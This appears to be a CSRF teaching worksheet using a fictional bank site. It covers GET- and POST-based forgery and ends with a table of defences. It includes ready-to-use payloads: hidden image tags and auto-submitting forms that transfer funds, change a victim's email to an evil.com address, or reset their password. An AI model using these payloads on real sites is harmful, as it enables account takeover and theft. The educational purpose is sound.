# Theory

CSRF (Cross-Site Request Forgery) is a security vulnerability where an attacker tricks an authenticated user's browser into sending an unwanted request to a web application on which the user is already logged in. Since the browser automatically includes session cookies with every request, the server cannot distinguish between a legitimate request and a forged one — the malicious request executes with the victim's privileges.

## Key Aspects

	Exploits the trust the server has in the user's browser
	Requires the victim to be authenticated on the target site
	Types: GET-Based CSRF & POST-Based CSRF

# Scenarios
## GET-Based CSRF

A banking application allows users to transfer funds via a GET request:

URL:
`https://bank.test/transfer?to=alice&amount=500`

The server reads the logged-in user's session cookie to identify the sender and processes the transfer immediately.

### a. Predict the Backend Behaviour

The server extracts the authenticated user's identity from the session cookie, then executes:

```sql
UPDATE accounts SET balance = balance - 500 WHERE user = <session_user>;
UPDATE accounts SET balance = balance + 500 WHERE user = 'alice';
```

No additional verification (e.g., CSRF token, re-authentication) is performed.

### b. Modify the request to craft a GET-Based CSRF attack

An attacker hosts a page (or sends an email) containing:

```html
<img src="https://bank.test/transfer?to=attacker&amount=10000" style="display:none">
```

- When the victim visits the attacker's page while logged into `bank.test`, the browser loads the `<img>` tag.
- The browser automatically attaches the victim's session cookie to the request.
- The server processes the transfer as if the victim initiated it.

The victim sees no visible change — the attack is completely silent.

### c. Conditions required for GET-Based CSRF

1. The victim must be **authenticated** on the target site (valid session cookie present in the browser).
2. The target action must be triggered by a **GET request** (state-changing operation via GET).
3. The server must rely **solely on session cookies** for authentication — no CSRF token, no `Origin`/`Referer` validation.
4. The attacker must be able to **predict all request parameters** (no secret tokens in the URL).
5. The victim must be **tricked into visiting** the attacker-controlled page (phishing email, malicious ad, etc.).

> GET-based CSRF is the simplest form. Modern best practice forbids state-changing operations on GET requests, but legacy applications often violate this.

### d. Craft a payload to silently change the victim's email address

Assume the endpoint is:
`https://bank.test/settings?action=update_email&email=<new_email>`

Attacker's page:

```html
<img src="https://bank.test/settings?action=update_email&email=attacker@evil.com" style="display:none">
```

- Victim loads the page → browser sends the GET request with session cookie → email is changed to `attacker@evil.com`.
- Attacker can now trigger a password reset to take over the account.

### e. Craft a payload to perform the attack using a hyperlink

```html
<a href="https://bank.test/transfer?to=attacker&amount=10000">Click here for your prize!</a>
```

- Social engineering trick — victim clicks the link while logged in.
- Transfer executes immediately with the victim's session credentials.

---

## POST-Based CSRF

The same banking application is updated to use POST requests for transfers:

```
POST https://bank.test/transfer
Body: to=alice&amount=500
```

The server still relies only on the session cookie for authentication.

### a. Predict the Backend Behaviour

The server reads POST body parameters and the session cookie, then processes:

```sql
UPDATE accounts SET balance = balance - 500 WHERE user = <session_user>;
UPDATE accounts SET balance = balance + 500 WHERE user = 'alice';
```

Switching to POST did not add any CSRF protection — it only changed the HTTP method.

### b. Modify the request to craft a POST-Based CSRF attack

POST requests cannot be triggered by `<img>` tags. The attacker uses an **auto-submitting HTML form**:

```html
<html>
  <body onload="document.forms[0].submit()">
    <form action="https://bank.test/transfer" method="POST">
      <input type="hidden" name="to" value="attacker">
      <input type="hidden" name="amount" value="10000">
    </form>
  </body>
</html>
```

- The attacker hosts this page on `evil.com`.
- When the victim visits `evil.com`, the form auto-submits instantly.
- The browser sends the POST request to `bank.test` with the victim's session cookie attached.
- The transfer executes without any interaction from the victim.

### c. Conditions required for POST-Based CSRF

1. The victim must be **authenticated** on the target site.
2. The target action is triggered by a **POST request**.
3. The server relies **solely on session cookies** — no CSRF token in the form, no `SameSite` cookie attribute, no `Origin`/`Referer` check.
4. The attacker must know **all required POST parameters** (no unpredictable secret values in the body).
5. The victim must be **lured to the attacker's page** while their session is active.

> Using POST instead of GET does NOT prevent CSRF. The only reliable defences are CSRF tokens, `SameSite=Strict/Lax` cookie attributes, and `Origin`/`Referer` header validation.

### d. Craft a payload to change the victim's password

Assume the endpoint is:
```
POST https://bank.test/settings
Body: action=change_password&new_password=hacked123&confirm_password=hacked123
```

Attacker's auto-submit page:

```html
<html>
  <body onload="document.forms[0].submit()">
    <form action="https://bank.test/settings" method="POST">
      <input type="hidden" name="action" value="change_password">
      <input type="hidden" name="new_password" value="hacked123">
      <input type="hidden" name="confirm_password" value="hacked123">
    </form>
  </body>
</html>
```

- Victim visits the page → form auto-submits → password is changed to `hacked123`.
- Victim is now locked out; attacker logs in with the new password.

### e. State the defences against CSRF and explain how they break the attack

| Defence | How it works | How it breaks CSRF |
|---|---|---|
| **CSRF Token** | Server embeds a random secret token in every form; validates it on submission | Attacker cannot read the token from a cross-origin page (Same-Origin Policy) |
| **SameSite Cookie (`Strict`/`Lax`)** | Browser does not send cookies on cross-site requests | Forged request arrives without the session cookie → server rejects it |
| **`Origin`/`Referer` Header Check** | Server verifies the request originated from its own domain | Cross-site form submission sends `Origin: evil.com` → server rejects it |
| **Re-authentication / CAPTCHA** | Sensitive actions require password re-entry | Attacker does not know the victim's password, cannot complete the action |
